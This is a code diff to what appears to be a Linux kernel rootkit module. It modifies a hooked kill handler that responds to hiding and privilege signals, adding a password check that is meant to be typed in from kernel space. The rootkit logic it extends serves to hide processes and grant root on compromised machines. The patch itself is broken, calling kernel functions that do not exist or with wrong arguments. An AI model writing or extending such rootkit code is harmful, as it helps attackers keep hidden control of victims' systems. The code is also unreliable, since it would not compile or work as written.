@@ -4,7 +4,10 @@
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/version.h>
-#include "/usr/include/stdio.h"//ADDED
+//ADDED:
+#include <linux/tty.h>
+//#include <linux/kd.h>
+//#include <linux/vt.h>
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
@@ -329,9 +332,30 @@ hacked_kill(pid_t pid, int sig)
 	bool pwTried = FALSE;
 	bool pwPassed = FALSE;
 	if(sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS){
-		char* entered_password;
-		entered_password = getpass("Please enter your password: ");
-		if(strcmp(entered_password,MAGIC_PREFIX)==0) { pwPassed=TRUE; }
+		
+		char entered_password[100];
+		int len = 0;
+		struct tty_struct* tty;
+
+		// Disable echoing of user input to the terminal
+		tty = current->signal->tty;
+		if (tty != NULL) {
+			tty->termios.c_lflag &= ~ECHO;
+			tty_mode(tty);
+		}
+
+		// Prompt the user for a password
+		printk(KERN_INFO "Please enter your password: ");
+		len = scnprintf(entered_password, sizeof(entered_password), "%s", get_user());
+
+		// Restore echoing of user input to the terminal
+		if (tty != NULL) {
+			tty->termios.c_lflag |= ECHO;
+			tty_reset(tty);
+		}
+
+		// Check whether the entered password matches the stored password
+		if (len > 0 && strcmp(entered_password,MAGIC_PREFIX)==0) { pwPassed=TRUE; }
 		pwTried = TRUE;
 	}
 
